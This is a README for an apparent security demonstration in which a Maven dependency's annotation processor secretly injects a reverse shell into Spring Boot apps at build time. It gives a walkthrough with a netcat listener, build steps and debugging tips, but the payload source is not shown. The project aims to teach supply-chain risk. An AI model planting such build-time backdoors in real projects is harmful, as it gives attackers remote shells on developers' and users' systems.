# spring-build-analyzer

Slightly malicious dependency (spring-build-analyzer) and a demonstration project (demo). This project is intended to highlight the issues of including untrusted dependencies in your builds.

## demonstration

**The project requires Maven and Java 17.**

While there is a base `pom.xml` - the two projects should be built interdependently:

```bash
cd spring-build-analyzer
mvn install -DskipTests=true
cd ..
```

Next, in a different terminal, open netcat to listen on port 9999:

```bash
nc -l 9999
```

Then compile and run the demo application:

```bash
cd demo
mvn package -DskipTests=true
java -jar ./target/demo-0.0.1-SNAPSHOT.jar
```

In a third terminal, validate that the demo application is working as expected:

```bash
curl localhost:8080
```

You should receive back `Greetings from Spring Boot!`. Very exciting, isn't it?

Last, return to the tab with the netcat listener and the reverse shell should have connected; you can test by running `whoami`:

```bash
$ nc -l 9999
whoami
jeremy
```

## Explanation

The `spring-build-analyzer` uses an annotation processor to inject a reverse shell into any spring-boot application that is compiled while the `spring-boot-analyzer` is on the classpath. If you look at the `demo` project you will see that the `spring-boot-analyzer` looks like just a standard dependency:

```xml
<dependency>
    <groupId>io.github.jeremylong.spring.analyzer</groupId>
    <artifactId>spring-build-analyzer</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <scope>compile</scope>
</dependency>
```

Currently, the reverse shell is benign as it only connects back to localhost on port 9999. This is just a demonstration of what can go wrong at build time.

## Reproducible Builds

The `demo` project is set up to create re-producible builds. This is useful for understanding that if the build has been compromised by including a malicious dependency or plugin - it doesn't matter where you build the project it is **Reproducibly Compromised**.

```bash
$ shasum -a 256 target/demo-0.0.1-SNAPSHOT.jar
b6c9aff1bcb9fd67be3aa96a97f33c626df801b62ffb2ec39b6c1a7f8878d210  target/demo-0.0.1-SNAPSHOT.jar

$ unzip -v target/demo-0.0.1-SNAPSHOT.jar
...
```

## Debugging

Did the above walk through not work? There might be a few reasons:

1. `curl localhost:8080` didn't return `Greetings from Spring Boot!`: 

   - Something is already running on port 8080. When the demo app is not running - ensure that nothing is running on port 8080.

2. No connection was made back to `nc -l 9999`.
   - Ensure nothing is running on port `9999`. Alternatively, update the port in the [CtxtListener source](https://github.com/jeremylong/spring-boot-analyzer/blob/651e919aa63b783b70eab96fb707192e6cd86341/spring-build-analyzer/src/main/java/io/github/jeremylong/spring/build/analyzer/SensorDrop.java#L31-L32) and rerun the above steps.
   - From the root of the project, after building the demo app validate that the `CtxtListener.class` exists: `ls demo/target/classes/io/github/jeremylong/spring/analyzer/demo/CtxtListener.class`. If the class does not exist, consider adding debugging statements [here](https://github.com/jeremylong/spring-boot-analyzer/blob/651e919aa63b783b70eab96fb707192e6cd86341/spring-build-analyzer/src/main/java/io/github/jeremylong/spring/build/analyzer/SensorDrop.java#L82) and re-installing the `spring-build-analyzer` and rebuilding the demo application.
   - If the `CtxtListener.class` does exist, uncomment the system out statements [here](https://github.com/jeremylong/spring-boot-analyzer/blob/651e919aa63b783b70eab96fb707192e6cd86341/spring-build-analyzer/src/main/java/io/github/jeremylong/spring/build/analyzer/SensorDrop.java#L63-L67) and re-install the `spring-build-analyzer`, rebuild the demo application, start netcat, and then run the demo app. The added debugging output may show what is going wrong on your system.


